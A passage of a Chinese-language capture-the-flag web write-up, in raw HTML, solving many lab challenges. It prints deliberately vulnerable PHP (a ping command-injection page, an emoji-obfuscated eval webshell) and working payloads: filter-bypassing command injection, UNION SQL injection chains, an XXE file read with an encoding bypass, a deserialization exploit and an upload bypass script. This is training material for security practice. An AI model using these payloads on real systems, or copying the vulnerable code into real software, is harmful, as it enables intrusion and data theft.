plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">  $userArr = array(&quot;username: admin&lt;br&gt;password: admin&quot;,&quot;username: docker&lt;br&gt;password: docker&quot;, &quot;username: mxx307&lt;br&gt;password: mxxxxxxx3333000777&quot;, &quot;username: FLAG_IN_HERE&lt;br&gt;password: 不给你看&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$cmd = strrev($_POST[&#x27;cmd&#x27;]);</span><br><span class=\"line\">if($cmd != &#x27;hint&#x27; &amp;&amp; $cmd != &#x27;phpinfo&#x27;)&#123;</span><br><span class=\"line\">  echo &quot;your SQL: SELECT * FROM users WHERE id=$cmd&quot;;</span><br><span class=\"line\">  echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($cmd == &quot;phpinfo&quot;) &#123;</span><br><span class=\"line\">  eval(&#x27;phpinfo();&#x27;);</span><br><span class=\"line\">&#125; else if(preg_match(&#x27;/127.0.0.1/&#x27;,$cmd) &amp;&amp; !preg_match(&#x27;/;|&amp;/&#x27;,$cmd )) &#123;</span><br><span class=\"line\">  system(&#x27;ping &#x27;.$cmd);</span><br><span class=\"line\">&#125; else if($cmd == &quot;hint&quot;) &#123;</span><br><span class=\"line\">  echo &#x27;可爱的CTFer哟,你掉的是这个金&quot;命令执行&quot;,还是这个银&quot;XSS&quot;还是这个普通的&quot;SQL注入&quot;呢?&#x27;;</span><br><span class=\"line\">&#125;else if(preg_match(&#x27;/^\\d$/&#x27;,$cmd, $matches)) &#123;</span><br><span class=\"line\">  if($matches[0] &lt;= 4 &amp;&amp; $matches[0] &gt;= 1)&#123;</span><br><span class=\"line\">    echo $userArr[$matches[0] - 1];</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    echo &quot;no user&quot;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">  echo &quot;猜猜猜&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023webshell是啥捏\"><a class=\"anchor\" href=\"#fsctf-2023webshell是啥捏\">#</a> [FSCTF 2023] webshell 是啥捏</h5>\n<p>很简单的一个题直接把</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">$😀=&quot;a&quot;;  </span><br><span class=\"line\">$😁=&quot;b&quot;;  </span><br><span class=\"line\">$😂=&quot;c&quot;;  </span><br><span class=\"line\">$🤣=&quot;d&quot;;  </span><br><span class=\"line\">$😃=&quot;e&quot;;  </span><br><span class=\"line\">$😄=&quot;f&quot;;  </span><br><span class=\"line\">$😅=&quot;g&quot;;  </span><br><span class=\"line\">$😆=&quot;h&quot;;  </span><br><span class=\"line\">$😉=&quot;i&quot;;  </span><br><span class=\"line\">$😊=&quot;j&quot;;  </span><br><span class=\"line\">$😋=&quot;k&quot;;  </span><br><span class=\"line\">$😎=&quot;l&quot;;  </span><br><span class=\"line\">$😍=&quot;m&quot;;  </span><br><span class=\"line\">$😘=&quot;n&quot;;  </span><br><span class=\"line\">$😗=&quot;o&quot;;  </span><br><span class=\"line\">$😙=&quot;p&quot;;  </span><br><span class=\"line\">$😚=&quot;q&quot;;  </span><br><span class=\"line\">$🙂=&quot;r&quot;;  </span><br><span class=\"line\">$🤗=&quot;s&quot;;  </span><br><span class=\"line\">$🤩=&quot;t&quot;;  </span><br><span class=\"line\">$🤔=&quot;u&quot;;  </span><br><span class=\"line\">$🤨=&quot;v&quot;;  </span><br><span class=\"line\">$😐=&quot;w&quot;;  </span><br><span class=\"line\">$😑=&quot;x&quot;;  </span><br><span class=\"line\">$😶=&quot;y&quot;;  </span><br><span class=\"line\">$🙄=&quot;z&quot;;  </span><br><span class=\"line\">  </span><br><span class=\"line\">$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if (isset($_GET[&#x27;👽&#x27;])) &#123;  </span><br><span class=\"line\">    eval($😭($_GET[&#x27;👽&#x27;]));  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>拿去解析一下就能知道这个😭是什么意思然后直接使用👽=cat /flag.txt 即可</p>\n<h5 id=\"湖湘杯-2021-finalpenetratable\"><a class=\"anchor\" href=\"#湖湘杯-2021-finalpenetratable\">#</a> [湖湘杯 2021 final] Penetratable</h5>\n<p>这个题对我来说真的有难度，这个题的步骤是这样的，一开始进行目录扫描，扫到了 phpinfo.php 和一些没有用的，看源码 static 可以看到很多 js 代码，这些 js 代码里面有一个 req 可以查看到账号信息和调用函数，知道了 admin 账号能够修改账号密码，root 用户能够下载文件，user 和 app 用户什么都干不了，那我们首先的目标是是看 admin 上面有没有突破口了。经过多次尝试可以使用 admin&quot;# 来创建用户冒牌一下 admin 账号然后修改 admin 的账号密码就能登录 admin 了，然后通过 admin 来修改 root 账号的密码 name 要 base64 加密，newpass 要 md5 加密 old 也是 md5，然后 pass 要 base64，修改成功后登录 root 账号查看 phpinfo 的内容满足 pass 里面的 get 然后利用下面那个执行命令，发现 catflag 没有权限 flag 文件权限比较高，我们使用 find 查看一下什么有权限查看到了 sed 可以使用，即可得到 flag 如 sed ‘p1’ /flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function updatePass()&#123;</span><br><span class=\"line\">    // let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))</span><br><span class=\"line\">    // let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;</span><br><span class=\"line\">    // let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;</span><br><span class=\"line\">    // let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))</span><br><span class=\"line\">    // $.ajax(&#123;</span><br><span class=\"line\">    //     url: &#x27;/?c=admin&amp;m=updatePass&#x27;,</span><br><span class=\"line\">    //     type: &#x27;post&#x27;,</span><br><span class=\"line\">    //     data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,</span><br><span class=\"line\">    //     // async:true,</span><br><span class=\"line\">    //     dataType: &#x27;text&#x27;,</span><br><span class=\"line\">    //     success: function(data)&#123;</span><br><span class=\"line\">    //         alertHandle(data);</span><br><span class=\"line\">    //     &#125;</span><br><span class=\"line\">    // &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nssround13-basicflaskjwt\"><a class=\"anchor\" href=\"#nssround13-basicflaskjwt\">#</a> [NSSRound#13 Basic]flask?jwt?</h5>\n<p>题目告诉的很直白，就是 jwt 伪造，你使用常规方法直接进行伪造即可把 id 改为 1</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py encode -c &quot;.eJwlzjEOwyAMBdC7MHewDQSTy0QY-6tdSTNVvXsjdX7L-6QDK85n2t_rikc6Xp72tHmTETEyuJSKqdypOZSUkatgRDMDKDAKK7oP0YYpRnNwc-79VqMhUChXEHNlabNWLTmrqAtvpiiNuumEmnJkJ3Zwdu_pjlxnrP9G0vcHIa0wBg.ZVRcxg.NZTyqvJ1HndRRn26eNYQ0gJryU8&quot;</span><br></pre></td></tr></table></figure></p>\n<p>[GWCTF 2019] 枯燥的抽奖</p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class=\"line\">str2 = &#x27;iiOj12Cfzb&#x27;</span><br><span class=\"line\">res = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">for char in str2:</span><br><span class=\"line\">    index = str1.find(char)</span><br><span class=\"line\">    res += str(index) + &#x27; &#x27; + str(index) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(res)</span><br></pre></td></tr></table></figure></p>\n<p>得到序列在通过 php_rand 去爆破种子得到种子在通过他得加密方法就可得到 $str</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">mt_srand(61046797);</span><br><span class=\"line\">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class=\"line\">$str=&#x27;&#x27;;</span><br><span class=\"line\">$len1=20;</span><br><span class=\"line\">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class=\"line\">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$str_show = substr($str, 0, 10);</span><br><span class=\"line\">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023细狗20\"><a class=\"anchor\" href=\"#fsctf-2023细狗20\">#</a> [FSCTF 2023] 细狗 2.0</h5>\n<p>直接使用 1;ls 可以发现有内容，然后使用 ls / 不行代表空格不能使用，那么我们使用 ${IFS} 来代替空格，然后在使用 cat 发现也不行要么使用 c\\at 要么使用 nl 即可然后就可以利用正则来匹配如 /f*</p>\n<h5 id=\"moectf-2021do-you-know-http\"><a class=\"anchor\" href=\"#moectf-2021do-you-know-http\">#</a> [MoeCTF 2021]Do you know HTTP</h5>\n<p>使用常规 header 即可得到 flag，注意我得 burp 不知道为什么发送这种请求只有第一次可以</p>\n<h5 id=\"nssctf-2022-spring-recruitbabysql\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruitbabysql\">#</a> [NSSCTF 2022 Spring Recruit]babysql</h5>\n<p>使用常规 sql 注入发现不行并且提示了给了我们一个说明过滤符号不行，那我们可以尝试一下其他办法比如我这里使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/database())&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;test&#x27;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">-a&#x27;/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)&#x27;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"羊城杯-2020blackcat\"><a class=\"anchor\" href=\"#羊城杯-2020blackcat\">#</a> [羊城杯 2020] Blackcat</h5>\n<p>下载音频使用 010 才能查看到源码，看到源码后可以发现漏洞函数使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br><span class=\"line\">&amp;White-cat-monitor[]=1&amp;One-ear=;cat flag.php</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hubuctf-2022-新生赛ezsql\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛ezsql\">#</a> [HUBUCTF 2022 新生赛] ezsql</h5>\n<p>admin 账号爆破密码为 iamcool 即可得到 flag 或者<br />\n整体思路为 update 注入，常见于修改用户数据的场景<br />\n这里注入并不需要单引号，直接拼凑 sql 语句<br />\n结合 updata 特性，常规操作爆一爆字段，表，列<br />\n拿不到 admin 密码就修改<br />\n（flag 在 description 中，为避免重开环境，可在 nickname 回显）</p>\n<h5 id=\"hnctf-2022-week2easy_unser\"><a class=\"anchor\" href=\"#hnctf-2022-week2easy_unser\">#</a> [HNCTF 2022 WEEK2]easy_unser</h5>\n<p>考点在于利用初始化函数来绕过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class body&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private $want,$todonothing = &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function  __construct($want)&#123;</span><br><span class=\"line\">        $About_me = &quot;&quot;;</span><br><span class=\"line\">        if($want !== &quot; &quot;) $this-&gt;want = $want;</span><br><span class=\"line\">        else $this-&gt;want = $this-&gt;todonothing;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$f = &quot;php://filter/convert.base64-encode/resource=f14g.php&quot;;</span><br><span class=\"line\">// 伪协议可以绕过is_file()函数, 并且还不等于f14g.php</span><br><span class=\"line\">$a = new body($f);</span><br><span class=\"line\">$b = serialize($a);</span><br><span class=\"line\">$c = preg_replace(&quot;/:2:&#123;/&quot;,&quot;:3:&#123;&quot;,$b);</span><br><span class=\"line\">echo urlencode($c);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"sctf-2021loginme\"><a class=\"anchor\" href=\"#sctf-2021loginme\">#</a> [SCTF 2021]loginme</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看结构体里面的使用X-Real-ip来伪造本地ip然后使用查看源码结构题能看出他的id=0,age=一个模块</span><br><span class=\"line\">使用age=&#123;&#123;.Password&#125;&#125;可以得到flag</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023ez_eval\"><a class=\"anchor\" href=\"#fsctf-2023ez_eval\">#</a> [FSCTF 2023]EZ_eval</h5>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script%0alanguage=&#x27;php&#x27;&gt;system(&#x27;c\\at$&#123;IFS&#125;/f*&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>过滤了空格和注意他的 &lt;? 即可绕过<br />\n新知识 paste 可以查看文件</p>\n<h5 id=\"csawqual-2019unagi\"><a class=\"anchor\" href=\"#csawqual-2019unagi\">#</a> [CSAWQual 2019]Unagi</h5>\n<p>页面一直在提示这是一个 xml 上传漏洞并且 flag 就在 /flag 那，那直接构造恶意 xxe 试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE users [</span><br><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class=\"line\">&lt;users&gt;</span><br><span class=\"line\">    &lt;user&gt;</span><br><span class=\"line\">        &lt;username&gt;bob&lt;/username&gt;</span><br><span class=\"line\">        &lt;password&gt;passwd2&lt;/password&gt;</span><br><span class=\"line\">        &lt;name&gt; Bob&lt;/name&gt;</span><br><span class=\"line\">        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  </span><br><span class=\"line\">        &lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class=\"line\">        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class=\"line\">    &lt;/user&gt;</span><br><span class=\"line\">&lt;/users&gt;</span><br></pre></td></tr></table></figure></p>\n<p>直接报错不行<br />\n那么使用加密试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt; ? x m l   v e r s i o n = &#x27; 1 . 0 &#x27; ? &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; ! D O C T Y P E   u s e r s   [ </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; ! E N T I T Y   x x e   S Y S T E M   &quot; f i l e : / / / f l a g &quot;   &gt; ] &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; u s e r s &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">        &lt; u s e r &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; u s e r n a m e &gt; b o b &lt; / u s e r n a m e &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; p a s s w o r d &gt; p a s s w d 2 &lt; / p a s s w o r d &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; n a m e &gt;   B o b &lt; / n a m e &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; e m a i l &gt; b o b @ f a k e s i t e . c o m &lt; / e m a i l &gt;     </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; g r o u p &gt; C S A W 2 0 1 9 &lt; / g r o u p &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">                &lt; i n t r o &gt; &amp; x x e ; &lt; / i n t r o &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">        &lt; / u s e r &gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt; / u s e r s &gt;</span><br></pre></td></tr></table></figure></p>\n<p>直接得到 flag</p>\n<h5 id=\"nssctf-2ndphp签到\"><a class=\"anchor\" href=\"#nssctf-2ndphp签到\">#</a> [NSSCTF 2nd] php 签到</h5>\n<p>注意查看代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">  </span><br><span class=\"line\">function waf($filename)&#123;    $black_list = array(&quot;ph&quot;, &quot;htaccess&quot;, &quot;ini&quot;);   </span><br><span class=\"line\">$ext = pathinfo($filename, PATHINFO_EXTENSION);  </span><br><span class=\"line\">    foreach ($black_list as $value) &#123;  </span><br><span class=\"line\">        if (stristr($ext, $value))&#123;  </span><br><span class=\"line\">            return false;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    return true;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if(isset($_FILES[&#x27;file&#x27;]))&#123;    $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $content = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);  </span><br><span class=\"line\">    if(waf($filename))&#123;        file_put_contents($filename, $content);  </span><br><span class=\"line\">    &#125; else &#123;  </span><br><span class=\"line\">        echo &quot;Please re-upload&quot;;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; else&#123;    highlight_file(__FILE__);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">url=&quot;http://node5.anna.nssctf.cn:28748/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">file_content = &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">file = &#123;&#x27;file&#x27;: (&#x27;1.php%2f.&#x27;, file_content)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(url, files=file)</span><br><span class=\"line\"></span><br><span class=\"line\">print(response.text)</span><br></pre></td></tr></table></figure></p>\n<p>直接使用这个即可上传一个 1.php/. 上去</p>\n<h5 id=\"october-2019twice-sql-injection\"><a class=\"anchor\" href=\"#october-2019twice-sql-injection\">#</a> [October 2019]Twice SQL Injection</h5>\n<p>二次注入，注入点在那个注册哪里然后到 login 那里面实现注入，首先需要</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select database()# </span><br><span class=\"line\">1&#x27; union select group_concat(table_name) from information_schema.tables where database()=table_schema# </span><br><span class=\"line\">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;# </span><br><span class=\"line\">1&#x27; union select group_concat(flag) from flag#</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ezhttp\"><a class=\"anchor\" href=\"#ezhttp\">#</a> EzHttp</h5>\n<p>这个题打开后难点在于代理这里你需要使用 via 学到新知识点，并且在添加 server 处如果有下划线的情况下需要使用把前面的下划线内容去掉</p>\n<h5 id=\"n00b_upload\"><a class=\"anchor\" href=\"#n00b_upload\">#</a> n00b_Upload</h5>\n<p>这个题只是过滤了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个题过滤了php但是我们依旧可以直接上传文件注意内容里面不要有php即可</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"easy_php\"><a class=\"anchor\" href=\"#easy_php\">#</a> easy_php</h5>\n<p>这个题注意下划线使用 [替代</p>\n<h5 id=\"广东强网杯-2021-团队组love_pokemon\"><a class=\"anchor\" href=\"#广东强网杯-2021-团队组love_pokemon\">#</a> [广东强网杯 2021 团队组] love_Pokemon</h5>\n<p>使用 od 来得到他的 8 进制字符串，然后在使用 python 写一个脚本恢复原本的字符串即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dump = &quot;0000000 066146 063541 067173 057551 064541 073537 057557 067567 0000020 060537 057551 064556 066537 074151 062565 064542 063556 0000040 064143 067145 057547 064564 067141 064555 064555 005175 0000060&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">b=&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">octs = [(&quot;0o&quot; + n) for n in  dump.split(&quot; &quot;) if n]</span><br><span class=\"line\"></span><br><span class=\"line\">hexs = [int(n, 8) for n in octs]</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">result = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for n in hexs:</span><br><span class=\"line\"></span><br><span class=\"line\">    if (len(hex(n)) &gt; 4):</span><br><span class=\"line\"></span><br><span class=\"line\">        swapped = hex(((n &lt;&lt; 8) | (n &gt;&gt; 8)) &amp; 0xFFFF)</span><br><span class=\"line\"></span><br><span class=\"line\">        result += swapped[2:].zfill(4)</span><br><span class=\"line\"></span><br><span class=\"line\">print(hexs)</span><br><span class=\"line\"></span><br><span class=\"line\">print(bytes.fromhex(result))</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"uuctf-2022-新生赛ezsql\"><a class=\"anchor\" href=\"#uuctf-2022-新生赛ezsql\">#</a> [UUCTF 2022 新生赛] ezsql</h5>\n<blockquote>\n<p>这个题就是一个 sql 注入但是过滤了 or 